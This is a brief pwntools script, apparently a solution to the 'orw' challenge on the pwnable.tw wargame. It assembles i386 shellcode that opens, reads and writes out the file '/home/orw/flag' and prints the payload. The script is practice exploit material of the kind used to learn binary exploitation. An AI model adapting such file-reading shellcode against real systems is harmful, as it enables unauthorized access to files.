from pwn import * 


#orw from pwnable.tw solution
context.arch='i386'
open_syscall = asm('mov ebx,0x804a0a2; mov eax,5; mov ecx,0x0; int 0x80')
read_sys = asm('mov ebx,eax;push 0x3; pop eax; mov ecx,0x804a0a0; push 50; pop edx; int 0x80')
write_syscall = asm('mov edx, 100; mov ebx, 1; mov eax, 4;mov ecx,0x804a0a0; int 0x80')
exit_syscall = asm('mov ebx, 1; mov eax, 1; int 0x80')

sploit = open_syscall+read_sys+write_syscall+exit_syscall+'/home/orw/flag\x00'
print sploit


	
